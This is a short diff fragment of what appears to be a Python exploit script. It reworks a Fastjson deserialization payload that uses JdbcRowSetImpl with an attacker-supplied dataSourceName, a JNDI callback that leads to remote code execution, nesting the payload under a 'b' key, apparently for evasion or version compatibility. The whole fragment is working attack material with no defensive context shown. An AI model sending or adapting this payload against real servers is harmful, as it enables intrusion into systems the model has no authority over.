@@ -31,7 +31,13 @@ headers = {
     }
     
 payload = """
-    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"%s", "autoCommit":true}
+    {
+        "b":{
+            "@type":"com.sun.rowset.JdbcRowSetImpl",
+            "dataSourceName":"%s",
+            "autoCommit":true
+        }
+    }
     """ %server
 
 try:
